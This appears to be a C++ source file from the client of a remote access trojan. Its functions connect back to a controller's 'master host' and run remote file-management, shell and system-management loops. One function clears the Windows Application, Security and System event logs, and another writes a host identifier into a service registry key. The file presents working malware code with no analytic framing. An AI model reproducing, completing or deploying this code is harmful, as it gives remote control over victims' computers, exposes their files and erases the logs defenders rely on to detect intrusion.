#pragma once
#include "stdafx.h"
#include "KernelManager.h"
#include "FileManager.h"
#include "ShellManager.h"
#include "SystemManager.h"

#include "until.h"
//#include "install.h"
#include <wininet.h>
class CKernelManager;
extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;

	CShellManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}


DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;

	CSystemManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}


void CleanEvent()
{
	char *strEventName[] = {"Application", "Security", "System"};

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
}